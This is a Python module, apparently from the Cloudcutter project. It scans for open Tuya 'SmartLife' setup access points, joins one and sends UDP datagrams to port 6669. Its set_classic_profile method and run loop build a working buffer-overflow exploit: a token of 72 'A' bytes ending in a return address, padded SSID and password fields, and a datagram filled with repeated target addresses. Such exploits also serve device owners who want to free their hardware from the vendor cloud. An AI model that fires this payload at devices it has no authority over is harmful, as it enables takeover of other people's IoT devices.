#  Copyright (c) Kuba Szczodrzyński 2024-3-23.

import asyncio
import random
import re
import string
from socket import AF_INET, SOCK_DGRAM, socket

from cloudcutter.core import Cloudcutter
from cloudcutter.modules.base import ModuleBase
from cloudcutter.types import NetworkInterface, WifiNetwork

from ._events import (
    TuyaApCfgConnectedEvent,
    TuyaApCfgFinishedEvent,
    TuyaApCfgFoundEvent,
    TuyaApCfgReadyEvent,
    TuyaApCfgSentEvent,
)
from ._types import ApCfgFrame


class TuyaApCfg(ModuleBase):
    core: Cloudcutter
    interface: NetworkInterface
    network: WifiNetwork | None
    payload: dict[str, str | bool | bytes | int] = None
    address_datagram: bytes = None

    def __init__(
        self,
        core: Cloudcutter,
        interface: NetworkInterface,
        network: WifiNetwork | None,
    ):
        super().__init__()
        self.core = core
        self.interface = interface
        self.network = network

    @staticmethod
    def generate_license() -> tuple[str, str, str]:
        def generate_random_ascii_string(length):
            return "".join(
                random.choices(string.ascii_letters + string.digits, k=length)
            )

        uuid = generate_random_ascii_string(12)
        auth_key = generate_random_ascii_string(16)
        psk = generate_random_ascii_string(32)
        return uuid, auth_key, psk

    def set_wifi_network(
        self,
        network: WifiNetwork,
        token: bytes = None,
    ) -> None:
        self.payload = {
            "ssid": network.ssid,
            "passwd": network.password,
            "token": token or b"1",
        }

    def set_ssid_password(
        self,
        ssid: bytes,
        password: bytes,
        token: bytes = None,
    ) -> None:
        self.payload = {
            "ssid": ssid,
            "passwd": password,
            "token": token or b"1",
        }

    def set_classic_profile(
        self,
        data: dict[str, str | int],
        uuid: str,
        auth_key: str,
        psk: str,
    ) -> None:
        def get_addr(key: str, length: int) -> bytes:
            address = int(data.get(key, "0"), 0)
            return address.to_bytes(byteorder="little", length=length)

        address_finish = get_addr("address_finish", length=3).rstrip(b"\x00")
        address_ssid = get_addr("address_ssid", length=3).rstrip(b"\x00")
        address_passwd = get_addr("address_passwd", length=3).rstrip(b"\x00")
        address_datagram = get_addr("address_datagram", length=4)
        address_ssid_padding = data.get("address_ssid_padding", 4)

        payload = {
            "auzkey": auth_key,
            "uuid": uuid,
            "pskKey": psk,
            "prod_test": False,
            "ap_ssid": "A",
            "ssid": "A",
            "token": b"A" * 72 + address_finish,
        }
        if address_ssid:
            padding = 4
            if address_ssid_padding:
                padding = address_ssid_padding
            payload["ssid"] = b"A" * padding + address_ssid
        if address_passwd:
            payload["passwd"] = address_passwd
        self.payload = payload
        self.address_datagram = address_datagram

    def encode_payload(self) -> bytes:
        payload = b"{"
        for k, v in self.payload.items():
            payload += f'"{k}":'.encode()
            match v:
                case bytes():
                    payload += b'"' + v + b'"'
                case str():
                    payload += b'"' + v.encode() + b'"'
                case True:
                    payload += b"true"
                case False:
                    payload += b"false"
                case int():
                    payload += str(v).encode()
                case _:
                    raise TypeError(f"Cannot encode '{type(v)}': {v}")
            payload += b","
        payload = payload.rstrip(b",")
        payload += b"}"
        return payload

    async def run(self) -> None:
        target_network: WifiNetwork | None = None
        while not target_network:
            networks = await self.core.wifi.scan_networks(self.interface)
            for network in networks:
                if network.auth is not None:
                    self.verbose(f"Skipping '{network.ssid}' because it's encrypted")
                    continue
                if re.match(r"^.+-[A-F0-9]{4}$", network.ssid) is None:
                    self.verbose(f"Skipping '{network.ssid}' because it doesn't match")
                    continue
                target_network = network
                break
            else:
                self.debug(f"Found {len(networks)} networks, but no SmartLife AP")
                await asyncio.sleep(2)

        TuyaApCfgFoundEvent(target_network).broadcast()

        self.debug("Disconnecting from network")
        await self.core.wifi.stop_station(self.interface)
        while await self.core.wifi.get_station_state(self.interface):
            self.debug("Waiting for disconnection...")
            await asyncio.sleep(1)

        self.debug("Clearing IP config")
        await self.core.network.get_ip4config(self.interface)

        self.debug(f"Connecting to '{target_network.ssid}'")
        await self.core.wifi.start_station(
            interface=self.interface,
            network=target_network,
        )

        while not (station := await self.core.wifi.get_station_state(self.interface)):
            self.debug("Waiting for connection...")
            await asyncio.sleep(1)
        self.debug(f"Connected to '{station.ssid}'")

        while not (ipconfig := await self.core.network.get_ip4config(self.interface)):
            self.debug("Waiting for IP address...")
            await asyncio.sleep(1)
        self.debug(f"Got IP address '{ipconfig}'")

        TuyaApCfgConnectedEvent(station, ipconfig[0]).broadcast()

        target_address = next(ipconfig[0].network.hosts())
        target_port = 6669

        while not (ping_rtt := await self.core.network.ping(target_address)):
            self.debug("Waiting for ping...")
            await asyncio.sleep(1)
        TuyaApCfgReadyEvent(target_network, target_address, ping_rtt).broadcast()

        frame = ApCfgFrame(payload=self.encode_payload())
        datagram = frame.pack()

        if self.address_datagram:
            pad_length = 256 - len(datagram)
            datagram += b"A" * (pad_length % 4)
            datagram += self.address_datagram * int(pad_length / 4)
            assert len(datagram) == 256

        while await self.core.network.ping(target_address):
            sock = socket(AF_INET, SOCK_DGRAM)
            for i in range(5):
                self.debug(
                    f"Sending ApCfg datagram #{i + 1} to {target_address}:{target_port}"
                )
                sock.sendto(datagram, (str(target_address), target_port))
                await asyncio.sleep(0.200)
            TuyaApCfgSentEvent(target_network, target_address, target_port).broadcast()

        self.debug("Device no longer responds, waiting for Wi-Fi disconnection")
        while (
            station := await self.core.wifi.get_station_state(self.interface)
        ) and station.ssid == target_network.ssid:
            self.debug("Waiting for disconnection...")
            await asyncio.sleep(1)
        TuyaApCfgFinishedEvent(target_network, target_address).broadcast()
